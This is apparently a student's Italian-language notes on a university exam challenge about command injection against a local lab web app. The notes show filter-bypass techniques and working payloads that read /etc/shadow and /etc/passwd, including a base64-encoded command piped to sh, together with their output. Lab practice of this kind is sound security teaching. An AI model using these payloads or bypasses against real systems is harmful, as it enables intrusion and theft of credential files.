Web Challenge Esame 9 Settembre 2022:

La challenge consiste nello sfruttare una command injection

Attraverso una richiesta GET alla root / con il parametro domain, e' possibile fare la richiesta dns ad un sito. e.g. /?domain=www.ulisse.unibo.it

Scopo dell'esercitazione e' quello di sfruttare la command injection e recuperare/leggere il file /etc/passwd

Sono presenti alcuni filtri sui caratteri che e' possibile utilizzare

Per ogni filtro "matched" verra' proposto un piccolo suggerimento

Lo studente dovra' quindi consegnare 3 file

1) Il file report.txt dove dovra' spiegare in maniera comprensibile il concetto dietro alla vulnerabilita' di questa challenge.

Lo studente dovra' inoltre elencare i vari passaggi e tentativi eseguiti per sfruttare la vulnerabilita', con i ragionamenti effettuati per "bypassare" i filtri, incluso ovviamente il payload finale

2) Lo screenshot dove e' possibile vedere chiaramente la chiamata all'applicazione con il payload e il risultato finale.

3) Il file etc/passwd

La qualita' del report incidera' sulla valutazione della parte pratica.

tentativi falliti:
http://localhost:8081/?domain=;cd --> Abbiamo filtrato il carattere ';'.. try harder! 
http://localhost:8081/?domain=pwd --> Errore! Il path non puo' terminare per "wd", cosa puo' usare per scavalcare questo filtro?
http://localhost:8081/?domain=cat --> Abbiamo disabilitato il comando 'cat'.. esistono altri comandi!

* `;` esegue comandi in sequenza, anche se il primo fallisce.
* Alternative:

  * `&&`: esegue il secondo solo se il primo ha successo.
  * `||`: esegue il secondo solo se il primo fallisce.
  * `\n`: andare a capo equivale a usare `;`.
  * `{ ... ; }`: gruppo di comandi nello stesso processo.
  * `( ... ; )`: gruppo in un sottoprocesso.
  * `if cmd1; then cmd2; fi`: controllo più esplicito.

**Alternative a `cat`:**

* `less`: visualizza file grandi in modo interattivo.
* `more`: simile a `less`, ma più semplice.
* `head`: mostra le prime linee.
* `tail`: mostra le ultime linee; con `-f` segue il file.
* `tac`: mostra il file al contrario (ultima → prima riga).
* `nl`: aggiunge numeri di riga.
* `awk`: stampa righe con più controllo.
* `sed`: modifica o stampa righe.
* `grep`: cerca e mostra righe che contengono un pattern.
* `vim`, `vi`: aprono il file in modalità editor.
* `xxd`: mostra contenuto in esadecimale.
* `column`: formatta in colonne (utile con dati tabellari).

http://localhost:8081/?domain=test||more%20/etc/shadow%20

/bin/sh: 1: nslookup: not found
::::::::::::::
/etc/shadow
::::::::::::::
root:*:19143:0:99999:7:::
daemon:*:19143:0:99999:7:::
bin:*:19143:0:99999:7:::
sys:*:19143:0:99999:7:::
sync:*:19143:0:99999:7:::
games:*:19143:0:99999:7:::
man:*:19143:0:99999:7:::
lp:*:19143:0:99999:7:::
mail:*:19143:0:99999:7:::
news:*:19143:0:99999:7:::
uucp:*:19143:0:99999:7:::
proxy:*:19143:0:99999:7:::
www-data:*:19143:0:99999:7:::
backup:*:19143:0:99999:7:::
list:*:19143:0:99999:7:::
irc:*:19143:0:99999:7:::
gnats:*:19143:0:99999:7:::
nobody:*:19143:0:99999:7:::
_apt:*:19143:0:99999:7:::

http://localhost:8081/?domain=test||more%20/etc/passwd%20
/bin/sh: 1: nslookup: not found
::::::::::::::
/etc/passwd
::::::::::::::

|    	- echo "cat /etc/passwd" | base64      (CONVERSIONE base64) |
-> http://localhost:8081/?domain=example.com%0Aecho Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh


